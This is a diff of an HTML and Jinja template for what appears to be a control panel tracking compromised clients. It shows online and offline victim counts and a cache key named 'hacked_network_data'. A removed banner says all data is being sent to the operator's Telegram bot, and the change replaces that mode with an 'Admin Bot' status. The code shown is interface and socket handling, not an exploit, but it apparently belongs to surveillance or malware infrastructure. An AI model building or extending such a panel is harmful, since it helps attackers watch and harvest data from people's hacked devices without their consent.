@@ -36,7 +36,6 @@
         .badge{ background:#2a3a50; padding:2px 12px; border-radius:20px; font-size:12px; margin-left:10px; }
         .offline-badge{ background:#ff6b6b33; color:#ff6b6b; }
         .timestamp{ font-size:11px; color:#445; margin-top:5px; }
-        .telegram-mode-banner{ background:#1a2430; padding:12px; border-radius:10px; margin-bottom:20px; text-align:center; border:1px solid #2a3a50; }
     </style>
 </head>
 <body>
@@ -52,28 +51,17 @@
     <span><span class="online-dot"></span> Online: <span id="onlineCount">0</span></span>
     <span><span class="offline-dot"></span> Offline: <span id="offlineCount">0</span></span>
     <span>📊 Total Users: <span id="totalCount">0</span></span>
-    <span class="bot-status {{ 'bot-active' if bot_enabled else 'bot-inactive' }}">
-        {{ '✅ Bot active' if bot_enabled else '❌ Bot not set' }}
+    <span class="bot-status {{ 'bot-active' if admin_bot_enabled else 'bot-inactive' }}">
+        {{ '🛡️ Admin Bot ON' if admin_bot_enabled else '🛡️ Admin Bot OFF' }}
     </span>
 </div>
 
-{% if bot_enabled %}
-<div class="telegram-mode-banner">
-    <strong>📨 Telegram Mode Active</strong><br>
-    All data is being sent to your Telegram bot. No data is displayed here to reduce server load.
-</div>
-{% else %}
 <div id="clientsGrid" class="client-grid"></div>
-{% endif %}
 
 <script>
     const socket = io();
     const CACHE_KEY = 'hacked_network_data';
 
-    {% if bot_enabled %}
-    // বট সক্রিয় থাকলে ড্যাশবোর্ডে কিছু দেখাবে না
-    document.getElementById('clientsGrid').innerHTML = '<div style="padding:40px;text-align:center;color:#556;">📨 Telegram mode active – data is being sent to bot.</div>';
-    {% else %}
     socket.on('connect', () => {
         socket.emit('admin_join');
     });
@@ -181,7 +169,6 @@
         localStorage.removeItem(CACHE_KEY);
         render({});
     });
-    {% endif %}
 </script>
 </body>
-    </html>
+              </html>
